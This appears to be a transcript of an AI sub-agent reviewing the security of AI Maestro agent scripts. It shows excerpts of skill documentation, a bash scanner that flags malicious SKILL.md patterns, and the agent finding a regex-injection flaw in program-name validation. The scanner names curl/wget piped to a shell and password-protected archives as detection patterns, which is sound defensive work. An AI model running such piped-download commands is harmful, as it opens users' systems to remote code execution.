   106→# Find references to a variable or constant  
   107→memory-search.sh "MAX_RETRY_COUNT" --mode symbol  
   108→```  
   109→  
   110→**When to use `symbol` vs `term`:**  
   111→- Use `--mode symbol` when searching for code identifiers (functions, classes, variables)  
   112→- Use `--mode term` when searching for exact phrases or non-code text  
   113→  
   114→## Why This Matters  
   115→  
   116→Without searching memory first, you will:  
   117→- Repeat explanations the user already heard  
   118→- Contradict previous decisions  
   119→- Miss context that changes the approach  
   120→- Start over instead of continuing  
   121→  
   122→**Memory search takes 1 second. Frustrating the user is much worse.**  
   123→  
   124→## Combining with Doc Search  
   125→  
   126→For complete context, use BOTH:  
   127→```bash  
   128→# User asks about creating a new feature  
   129→memory-search.sh "feature"       # What did we discuss?  
   130→docs-search.sh "feature"         # What do docs say?  
   131→```  
   132→

   134→  
   135→This skill relies on an internal helper script that provides shared utility functions:  
   136→  
   137→- **`memory-h  

... [403 more chars truncated]

    39→## Output Directory  
    40→  
    41→Planning output files (`task_plan.md`, `findings.md`, `progress.md`) should be written to:  
    42→  
    43→1. The directory specified by the `AIMAESTRO_PLANNING_DIR` environment variable (if set)  
    44→2. Otherwise, `docs_dev/` in the current project root  
    45→3. Create the directory if it does not exist  
    46→  
    47→Do NOT write planning files to the project root — use `docs_dev/` to avoid cluttering the project.  
    48→  
    49→---  
    50→  
    51→## The 3-File Pattern  
    52→  
    53→Create these files in `docs_dev/` (not the project root or the skill directory):  
    54→  
    55→| File | Purpose | Update When |  
    56→|------|---------|-------------|  
    57→| `task_plan.md` | Goals, phases, decisions, errors | After each phase |  
    58→| `findings.md` | Research, discoveries, resources | During research |  
    59→| `progress.md` | Session log, test results | Throughout session |  
    60→  
    61→---  
    62→  
    63→## Quick Start  
    64→  
    65→Before any complex task (3+ steps):  
    66→  
    67→```bash  
    68→# 1. Determine output directory  
    69→PLAN_DIR="${AIMAESTRO_PLANNING_DIR:-docs_dev}"  
    70→mkdir -p "$PLAN_DIR"  
    71→  
    72→# 2. Create planning files from templates  
    73→cat ~/.claude/skills/planning/templates/task_plan.md > "$PLAN_DIR/task_plan.md"  
    74→cat ~/.claude/skills/planning/templates/findings.md > "$PLAN_DIR/findings.md"  
    75→cat ~/.claude/skills/planning/templates/progress.md > "$PLAN_DIR/progress.md"

Located alongside the tool scripts in `~/.local/bin/` (installed) or `plugin/src/scripts/` (source).     53→# ToxicSkills Security Scanner  
    54→# Scans SKILL.md files for malicious patterns before installation.  
    55→# Uses mcp-scan if available, falls back to built-in pattern checks.  
    56→# Returns 0 (safe), 1 (critical - block), 2 (warning - proceed with caution)  
    57→scan_skill_security() {  
    58→    local skill_path="$1"  
    59→    local skill_name="${2:-unknown}"  
    60→  
    61→    # Find SKILL.md in the given path  
    62→    local skill_md=""  
    63→    if [[ -f "$skill_path/SKILL.md" ]]; then  
    64→        skill_md="$skill_path/SKILL.md"  
    65→    elif [[ -f "$skill_path" ]] && [[ "$skill_path" == *.md ]]; then  
    66→        skill_md="$skill_path"  
    67→    fi  
    68→  
    69→    if [[ -z "$skill_md" ]]; then  
    70→        print_warning "No SKILL.md found to scan at: $skill_path"  
    71→        return 0  
    72→    fi  
    73→  
    74→    local content  
    75→    content=$(cat "$skill_md" 2>/dev/null) || return 0  
    76→  
    77→    local has_critical=false  
    78→    local has_warning=false

    85→        has_critical=true  
    86→    fi  
    87→  
    88→    # 2. curl/wget piped to shell

    90→        print_error "CRITICAL: Remote code execution pattern detected (curl/wget piped to shell)"  
    91→        has_critical=true  
    92→    fi  
    93→  
    94→    # 3. Password-protected archives  
    95→    if echo "$content" | grep -qiE 'unzip\s+-P\s|7z\s+x\s+-p|tar.*--passphrase'; then

## <span style="color:#FF9800">◈ SUB-AGENT</span>  *[2026-02-16 03:25:07]*

<details>
<summary>🔧 Tool: Read -- `aimaestro-agent.sh`</summary>

**Input:**

  1050→            ;;  
  1051→    esac  
  1052→}  
  1053→  
  1054→# ============================================================================  
  1055→# CREATE  
  1056→# ============================================================================  
  1057→  
  1058→cmd_create() {  
  1059→    local name="" dir="" program="claude-code" model="" task="" tags=""  
  1060→    local no_session=false no_folder=false force_folder=false  
  1061→    local -a program_args=()  # Arguments to pass to the program (after --)  
  1062→  
  1063→    while [[ $# -gt 0 ]]; do  
  1064→        case "$1" in  

</details>


## <span style="color:#FF9800">◈ SUB-AGENT</span>  *[2026-02-16 03:25:15]*

<div style="border-left: 4px solid #FF9800; padding-left: 12px; margin: 4px 0;">

The default is "claude-code". User input flows directly into `program` from `--program` flag. The whitelist validation happens before any usage, so that's fine. But the `${program_lower}` in the regex is unquoted -- if someone passes `*` as a program name, it would be expanded by the regex engine. However, the regex pattern `[[:space:]]${program_lower}[[:space:]]` in `=~` is on the right side of `=~`, so it IS treated as a regex. If `program_lower` contains regex metacharacters (like `.*` or `+`), it could match unexpectedly. For example, `--program "c.*"` would match "claude-code claude codex..." in the whitelist. This is a regex injection in the program validation.  

Let me now check for differences between the two copies (`src/` vs `plugins/`) of `aimaestro-agent.sh`.  

</div>


## <span style="color:#FF9800">◈ SUB-AGENT</span>  *[2026-02-16 03:25:16]*
